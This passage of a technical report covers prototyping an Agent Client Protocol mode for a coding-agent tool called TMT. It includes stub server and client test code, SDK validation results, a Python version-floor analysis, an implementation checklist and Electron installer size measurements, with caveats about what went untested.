        slot = pending.get(rid)
        if slot:
            slot[1] = msg.get("result")
            slot[0].set()
    elif method == "initialize":
        reply(rid, {"protocolVersion": 1,
                    "agentCapabilities": {"loadSession": False},
                    "agentInfo": {"name": "tmt-stub", "version": "0.0.1"},
                    "authMethods": []})
    elif method == "session/new":
        sid = "sess_%d" % next(ids)
        cancelled[sid] = threading.Event()
        reply(rid, {"sessionId": sid})
    elif method == "session/prompt":         # long-running: must not block the reader
        threading.Thread(target=run_prompt, args=(rid, params), daemon=True).start()
    elif method == "session/cancel":         # notification: no reply
        sid = params.get("sessionId")
        if sid in cancelled:
            cancelled[sid].set()
        for slot in list(pending.values()):  # unblock a waiting permission request
            slot[1] = None
            slot[0].set()
    elif rid is not None:
        reply(rid, error={"code": -32601, "message": "Method not found: %s" % method})


def main():
    for line in sys.stdin:                   # EOF => the client is gone => exit
        line = line.strip()
        if line:
            try:
                handle(json.loads(line))
            except Exception as exc:         # never die on one bad message
                print("stub error: %r" % exc, file=sys.stderr)


if __name__ == "__main__":
    main()
```

`acp_client_test.py`:

```python
"""Scripted ACP client: drives acp_stub.py and asserts the message sequence."""
import json
import os
import subprocess
import sys

here = os.path.dirname(os.path.abspath(__file__))


def run(cancel=False):
    p = subprocess.Popen([sys.executable, "-u", os.path.join(here, "acp_stub.py")],
                         stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         universal_newlines=True, bufsize=1)
    seq = []

    def send(o):
        o["jsonrpc"] = "2.0"
        p.stdin.write(json.dumps(o) + "\n")
        p.stdin.flush()

    def recv():
        line = p.stdout.readline()
        assert line, "stub closed stdout"
        return json.loads(line)

    send({"id": 1, "method": "initialize", "params": {
        "protocolVersion": 1, "clientInfo": {"name": "test", "version": "0"},
        "clientCapabilities": {}}})
    r = recv()
    assert r["id"] == 1 and r["result"]["protocolVersion"] == 1, r
    send({"id": 2, "method": "session/new", "params": {"cwd": here, "mcpServers": []}})
    sid = recv()["result"]["sessionId"]
    send({"id": 3, "method": "session/prompt", "params": {
        "sessionId": sid, "prompt": [{"type": "text", "text": "hi"}]}})
    while True:
        m = recv()
        if m.get("method") == "session/update":
            u = m["params"]["update"]
            seq.append(u["sessionUpdate"] + (":" + u["content"]["text"].strip()
                       if "content" in u else ":" + u["status"]))
        elif m.get("method") == "session/request_permission":
            seq.append("permission")
            opts = {o["kind"]: o["optionId"] for o in m["params"]["options"]}
            if cancel:
                send({"method": "session/cancel", "params": {"sessionId": sid}})
            else:
                send({"id": m["id"], "result": {"outcome": {
                    "outcome": "selected", "optionId": opts["allow_once"]}}})
        elif m.get("id") == 3:
            stop = m["result"]["stopReason"]
            break
    p.stdin.close()
    p.wait(timeout=5)
    return seq, stop


seq, stop = run()
assert seq == ["agent_message_chunk:Looking at your request.", "permission",
               "tool_call_update:completed", "agent_message_chunk:Done (allow-once)."], seq
assert stop == "end_turn", stop
seq, stop = run(cancel=True)
assert seq == ["agent_message_chunk:Looking at your request.", "permission"], seq
assert stop == "cancelled", stop
print("PASS: happy path (allow_once -> end_turn) and cancel (-> cancelled)")
```

## 19. ACP proof of concept: validation against the official SDK, and the Python floor

**Validation result: PASS, no schema corrections were needed.** Environment: Python 3.12 venv (`py -3.12`; the machine has 3.14, 3.12, 3.11 and a uv 3.11, no 3.8-3.10), official SDK `agent-client-protocol` 0.12.1 ([PyPI](https://pypi.org/project/agent-client-protocol/), requires Python >=3.10,<3.15, depends on pydantic 2.13.5), `vermin` 1.8.0. Files are in `scratchpad\acp-poc\` (`acp_stub.py`, `acp_client_test.py`, `validate_schema.py`, `sdk_client_test.py`).
1. **Model validation (`validate_schema.py`).** Ran the stdlib stub through a happy path and a cancel path and validated every message in both directions with the SDK's pydantic models (`InitializeRequest/Response`, `NewSessionRequest/Response`, `PromptRequest/Response`, `SessionNotification`, `RequestPermissionRequest/Response`, `CancelNotification`): **20 of 20 messages validate**. I confirmed the models are strict (they reject a bogus `stopReason`, a flat `outcome`, and an unknown `sessionUpdate`), so a pass is meaningful.
2. **Real SDK client (`sdk_client_test.py`).** Drove the stub with the SDK's own `acp.spawn_agent_process` / `ClientSideConnection` and a `Client` subclass: `initialize` -> `new_session` -> `prompt` -> receives two `agent_message_chunk` updates plus a `tool_call_update` and a `request_permission` call (answered with `AllowedOutcome(outcome="selected", option_id=...)` for the `allow_once` option) -> `stop_reason == "end_turn"`; a second run cancels via `conn.cancel(...)` while the permission request is pending and gets `stop_reason == "cancelled"`. Output: `SDK CLIENT PASS`.
3. **Corrections to my earlier work:** none to the stub or tests. Only the earlier catalogue's flat `outcome` form was wrong, already fixed in section 6 (the real shape is nested: `{"outcome": {"outcome": "selected", "optionId": ...}}`). SDK also confirms `elicitation/create` exists (`CreateElicitationRequest`, form/URL modes, accept/decline/cancel responses), so my earlier doubt (404 on a doc URL) is resolved: ACP has a structured-question primitive that can carry TMT's `choose`. Caveat: tested against the SDK only, **not against Zed or JetBrains**.

**Python version floor (vermin 1.8.0, static analysis, run on 2026-10-01).**

| Target | Result | Notes |
|---|---|---|
| `acp_stub.py` (stdlib) | minimum **3.3** | No version-specific features; the stdlib NDJSON ACP layer imposes no floor above TMT's |
| TMT engine, 52 of 53 top-level `*.py` (everything except `agent_uninstall.py`; `--eval-annotations`) | minimum **3.8** | **Confirms the "3.8+" claim statically** (`pyproject.toml` has `requires-python = ">=3.8"`). Not confirmed by running on 3.8: no 3.8 interpreter is installed here |
| `agent_uninstall.py` | reports 3.12 | One construct: `shutil.rmtree(onexc=...)` at line 289, but it sits inside `if sys.version_info >= (3, 12):` with an `onerror=` fallback, so this is a **vermin false positive**; real floor stays 3.8 |
| all 53 files together | reports 3.12 | Only because of the above |
| `testing/` | reports 3.12 | `tomllib` (3.11) in `test_agent_cli.py` and `test_agent_npm.py`, and `rmtree(onexc)` in two tests: the **test suite** needs 3.11+ for those files unless guarded (not an engine issue) |

Conclusions: (a) TMT's 3.8 floor is plausible for the engine; (b) a stdlib-only ACP layer keeps that floor, while using the official SDK would raise it to 3.10 and add pydantic (the SDK is therefore only suitable for test/validation or an optional extra); (c) every Python GUI toolkit in the other reports (PySide6, Flet, NiceGUI: 3.10+) also exceeds 3.8, so any GUI that runs in the user's Python needs 3.10+ while a frozen sidecar/engine avoids the question.

## 20. ACP readiness checklist for a `tmtcode --acp` mode (read from TMT source; day counts are my rough estimates for one developer)

Key finding: TMT already has the pattern needed. `--ci` mode (`TMT.py:run_ci`, ~1026) rebinds `sys.stdout = sys.stderr` so a JSON result is the only thing on stdout, and `agent_ci.Run` supplies replacement `approve(question, pattern="")` and `choose(text, keys)` callables that `_session_loop` injects into the action context (`TMT.py` ~1635-1646). An ACP mode is a second, interactive-over-JSON variant of that seam.

| # | Change | Where (file:function, approx. line) | Est. days |
|---|---|---|---|
| 1 | Add `--acp` flag; route in `main()` before the splash/menu like `--ci`; flag must be mutually exclusive with `--ci`/PATH words (cwd arrives in `session/new`) | `TMT.py:parse_args` (~922-1024), `TMT.py:main` (~1103) | 0.5 |
| 2 | Protocol server: stdlib NDJSON JSON-RPC reader thread, writer with lock, request-id table with `threading.Event` slots (the PoC's ~116 lines) as a new module, e.g. `agent_acp.py` | new file | 2 |
| 3 | Pollution guard: rebind `sys.stdout = sys.stderr` and keep the real stream only for the protocol (as `run_ci` already does); silence the splash/menu/`clear_screen()`/`run_startup`/`ensure_api_key` prompts (they `console.input`) and update notice; `rich` `Console()` (`agent_config.py:88`) resolves `sys.stdout` at print time so the rebind covers it, but verify; direct `print(` calls: TMT.py 22, agent_config.py 2, agent_model.py 1, agent_prompt.py 3; `subprocess` use in 7 places must not inherit fd 1 (confirm each captures stdout); `LiveRelay`/`live_ui` ANSI writes must be replaced by a sink | `TMT.py:main`, `agent_config.py:88`, `agent_live_renderer.py`, `agent_ui.py` | 2 |
| 4 | Turn start: `_session_loop` (~1343-2200, one ~850-line function) pulls the task from `prompt_box.ask(...)` (~1486) or `ci.task` (~1466). Refactor into "get next task" + "run one turn" so ACP's `session/prompt` can feed the same turn body and return a stop reason. This is the biggest, riskiest change because terminal, queueing, `/commands`, type-ahead and rendering are interleaved in one function | `TMT.py:_session_loop` | 4-6 |
| 5 | Stream events to `session/update`: wrap/replace `stream_handler` (~81): `text` -> `agent_message_chunk`; `usage` -> `usage_update`; `progress` and `action` -> `tool_call`/`tool_call_update` (or thought chunks); drop `output` (meter-only); `next_step` held until end of turn. Also tap `Transcript.emit_kind` (`agent_ui.py` ~1016, kinds in `EVENT_KINDS` ~741) before it formats terminal lines, mapping `file_edit`/`file_create`/`file_delete`/`command`/`test` onto ACP tool `kind`s and attaching diffs (edit events today carry counts, so diff text must be added to `detail`) | `TMT.py:stream_handler`, `agent_ui.py:Transcript.emit/emit_kind` | 3 |
| 6 | Approvals: implement `approve(question, pattern="")` as a blocking `session/request_permission` (options allow_once/allow_always/reject_once; return `"y"`/`"always"`/`"n"` strings because `agent_bash` interprets them; `False` when no client); no type-ahead stop/start, no `write_above`. Choose: `choose(text, keys)` as `elicitation/create` or, for clients without it, a permission request with custom option ids; preserve the `None` (nobody) vs `""` (dismissed) distinction | `TMT.py:_command_approval` (~488), `_question_asker` (~548), injection at ~1635-1646; model on `agent_ci.Run.approve/choose` (~284/308) | 1.5 |
| 7 | Cancellation: today a Ctrl-C raises `KeyboardInterrupt` in the turn thread and the loop catches it at ~2191 (`relay.abort()`, "Task cancelled", outcome "you stopped it with Ctrl-C"); also ~1088 in `run_ci`. In ACP mode the turn runs while a reader thread is receiving `session/cancel`, so use a cooperative flag the model-stream reader and action loop check (workers already use `WorkerCancelled` via `agent_manager`), also unblocking a pending approval; reply `stopReason: "cancelled"`. Tool subprocesses (bash) need tree-kill on cancel | `TMT.py:_session_loop` (~2191), `agent_worker.py`/`agent_manager.py` (`WorkerCancelled`), `agent_bash.py` | 2-3 |
| 8 | Background agents: `AgentManager.subscribe(listener(event_name, record))` (`agent_manager.py` ~458) -> `_tmt/agents.changed` notifications; listener runs on worker threads, so enqueue to the writer thread; debounce `agent_token_update` | `agent_manager.py:subscribe/_emit`, `TMT.py` ~1458 | 1 |
| 9 | Plan: `session.plan` (`agent_session.py:260`, `agent_plan.Plan`, `PlanStep.as_dict()`) has no change event; add a hook at plan mutation and map to ACP `plan` updates (statuses beyond pending/in_progress/completed need mapping) | `agent_plan.py`, `agent_actions.py` (`_plan_state` ~184) | 1 |
| 10 | Slash commands: expose `agent_commands` list through `available_commands_update`; handle `/cmd` in prompt text; commands that draw menus (`/back`, settings) need ACP-safe variants or must be hidden | `agent_commands.py` (`completions`, `run_note`), `TMT.py` ~1408-1523 | 1.5 |
| 11 | Sessions: `session/new` carries `cwd` -> `resolve_workspace(directory, ask=lambda _: "n")` exactly as CI does (refuses non-git non-empty dirs); the engine currently assumes one session per process, and `set_workspace_root` is global state, so support one session per process initially | `TMT.py:resolve_workspace`, `agent_config`/`agent_session` | 1 |
| 12 | `_tmt/*` extensions for features ACP lacks (see below) and tests: golden NDJSON transcripts in the existing suite (about 2,600 tests), plus an SDK-client conformance test like `sdk_client_test.py` in CI (needs Python 3.10+) | `testing/` | 2-3 |

Estimated total: roughly 20-26 working days for a solid mode (about 5 weeks), or about 8-10 days for a thin "text + approvals + cancel only" version (items 1, 2, 3, 5 partial, 6, 7, 11). These are my estimates, not measurements, and item 4 dominates the uncertainty.

**TMT features with no ACP equivalent (need `_tmt/*` extensions):** background-agent fleet and notes (`agent_manager` events, up to 10 workers), checkpoint/undo (`agent_checkpoint.capture/commit/history/find`, `RestorePlan`), the review/verify gates (`_review_veto`, `_verify_veto`), `/note` side questions, settings and model/effort switching beyond ACP's `session/set_mode` / config options, project-context and memory controls, auto-update, and the "next step suggestion" event. Features that map cleanly: streaming text, tool calls, diffs, permission requests, plan, cancel, slash commands, usage.

## Appendix B: SDK-based tests (added after validation)

`sdk_client_test.py` (drives `acp_stub.py` with the official `acp.spawn_agent_process`), run with the venv Python: output `SDK CLIENT PASS: initialize -> session/new -> prompt -> 2 chunks + permission(allow_once) -> end_turn; cancel -> cancelled`.

```python
"""Drive acp_stub.py with the OFFICIAL SDK client connection (ClientSideConnection)."""
import asyncio, os, sys
import acp
from acp import text_block
from acp.schema import AllowedOutcome, DeniedOutcome

here = os.path.dirname(os.path.abspath(__file__))

class TestClient(acp.Client):
    def __init__(self, cancel_on_permission=False):
        self.events, self.cancel_on_permission, self.conn, self.sid = [], cancel_on_permission, None, None
    def on_connect(self, conn): self.conn = conn
    async def session_update(self, session_id, update, **kw):
        t = update.session_update
        self.events.append(t + (":" + update.content.text.strip() if hasattr(update, "content") and hasattr(update.content, "text") else ""))
    async def request_permission(self, options, session_id, tool_call, **kw):
        self.events.append("permission:" + ",".join(o.kind for o in options))
        if self.cancel_on_permission:
            asyncio.get_event_loop().call_later(0.05, lambda: asyncio.ensure_future(self.conn.cancel(session_id=session_id)))
            await asyncio.sleep(0.5)       # the stub answers the prompt with 'cancelled' once cancel arrives
            return acp.RequestPermissionResponse(outcome=DeniedOutcome(outcome="cancelled"))
        opt = next(o for o in options if o.kind == "allow_once")
        return acp.RequestPermissionResponse(outcome=AllowedOutcome(outcome="selected", option_id=opt.option_id))

async def run(cancel):
    client = TestClient(cancel)
    async with acp.spawn_agent_process(client, sys.executable, "-u", os.path.join(here, "acp_stub.py")) as (conn, proc):
        init = await conn.initialize(protocol_version=1)
        sess = await conn.new_session(cwd=here, mcp_servers=[])
        resp = await conn.prompt(session_id=sess.session_id, prompt=[text_block("hi")])
        return init, client.events, resp.stop_reason

async def main():
    init, ev, stop = await asyncio.wait_for(run(False), 20)
    assert init.agent_info.name == "tmt-stub" and init.protocol_version == 1, init
    assert ev == ["agent_message_chunk:Looking at your request.", "permission:allow_once,allow_always,reject_once",
                  "tool_call_update", "agent_message_chunk:Done (allow-once)."], ev
    assert stop == "end_turn", stop
    _, ev, stop = await asyncio.wait_for(run(True), 20)
    assert stop == "cancelled", (ev, stop)
    print("SDK CLIENT PASS: initialize -> session/new -> prompt -> 2 chunks + permission(allow_once) -> end_turn; cancel -> cancelled")
asyncio.run(main())
```

## 21. Verified locally (Electron), 2026-10-01

Scratch project `scratchpad\electron-poc\` (not in the repo): Node 22.18.0, npm 10.9.3, `electron` ^44.5.1 and `electron-builder` ^26.15.3 (installed in about 16 s). Files: `main.js` (BrowserWindow with `contextIsolation: true`, `sandbox: true`, `nodeIntegration: false`; `will-navigate` blocked; `setWindowOpenHandler` denies windows and opens only http/https externally; spawns `python engine_stub.py`, forwards `stream.text`, holds the engine blocked on `approval.request` until the user answers; kills the process tree with `taskkill /T /F` on quit), `preload.js` (exposes only `start`, `approve`, `cancel` and two event subscriptions through `contextBridge`, no raw `ipcRenderer`), `index.html` (CSP `default-src 'none'; script-src 'self'; style-src 'self'; connect-src 'none'`, no inline script), `renderer.js` (writes model text with `textContent`), `engine.js` (the spawn/NDJSON JSON-RPC module, no Electron imports) and `headless_test.js`. The engine stub is the one from the .NET proof of concept (`dotnet-poc\engine_stub.py`), unchanged.

| Check | Result |
|---|---|
| Headless protocol test (`node headless_test.js`, same `engine.js` the app uses, window never launched) | **PASS**: `turn.start`, `stream.text` chunks, engine-to-UI blocking `approval.request` answered `always`, a slow turn cancelled by `turn.cancel` (reply `cancelled`, 327 ms), engine exits with code 0 on stdin close. Output `PASS [["Run `git status`?","git status"]] cancel_after_ms=327 exit=0` |
| Electron window, preload bridge, CSP, `taskkill` tree-kill on quit | **NOT run** (window never launched, by instruction); the code is written but untested |
| NSIS x64 build (`electron-builder --win nsis --x64`, unsigned, default icon) | **Succeeded**, 2 min 14 s wall-clock on the first run (includes downloading the Electron zip, NSIS and 7-zip tools; a warm rebuild was not timed) |
| **Installer** (`TMT PoC Setup 0.0.1.exe`) | **106.1 MiB** (111,222,629 bytes) |
| **Unpacked app** (`win-unpacked`) | **about 368 MB** on disk (`TMT PoC.exe` alone is 245.7 MB; `dxcompiler.dll` 25.7 MB, `resources.pak` 12.4 MB, `icudtl.dat` 10.9 MB; 55 locale files, 49 MB; `app.asar` with all the app code is only 11.9 KB) |

Comparison with the measured WPF figures (WPF sizes as reported by the coordinator, not re-measured by me; both **already include** the 24.8 MB frozen engine; MB/MiB not distinguished):

| Shell | Installer, engine included |
|---|---|
| WPF, framework-dependent, Velopack | about 28 MB (27.8 MB; needs the .NET runtime on the PC) |
| WPF, self-contained, Velopack | about 95 MB (94.5 MB) |
| Electron 44, NSIS (this test) | about 131 MB (estimated: 106.1 MiB measured for the shell alone, plus the 24.8 MB engine not bundled in this test) |

Correction note: an earlier version of this table added the 24.8 MB engine to the WPF figures a second time (giving 119 / 53 MB); that double-count has been removed.

Interpretation (mine): an Electron installer with the engine (about 131 MB) is about 36 MB larger than self-contained WPF with the engine (about 95 MB), so on installer size the two are close, and Electron's real cost is the installed footprint (about 368 MB unpacked, driven by the 245.7 MB main executable in Electron 44) and RAM, not download size. The earlier "80-150 MB installer" estimate for Electron in section 1 holds (106 MB measured before the engine). Caveats: unsigned build; default icon; one run; no compression tuning (NSIS settings, `electronLanguages` trimming to cut the 49 MB of locales, or LZMA options were not tried); the unpacked-size figure is `du` output rounded to whole MB; the engine size was not re-measured here; the build log mentioned `signtool.exe` although `signAndEditExecutable` was false and no certificate was configured, so I did not verify whether the exe was signed (assumed not).

## Unverified / caveats
- Section 17 details for gptme, OpenHands, aider and Continue come from READMEs, DeepWiki and docs summaries, not from reading their source. Zed on Windows with an npm `.cmd` shim is untested.
- Installer size for Tauri+frozen Python (30-80 MB) is my estimate; Tauri/Electron base sizes come from blog benchmarks (PkgPulse, OpenReplay), not first-party.
- Neutralino license (MIT) from memory; GitHub API returned NOASSERTION. Jan license conflicting between sources.
- ACP `elicitation/create`: present in the official SDK 0.12.1 (section 19), but I did not test it or read its spec page (404); stability unknown. Rust crate names/method signatures in section 7 are from memory.
- Claude Desktop / Cursor backend transports are not publicly documented.
- PyPI JSON for pywebview/pytauri looked stale or inconsistent with GitHub; GitHub and the project changelog were preferred.
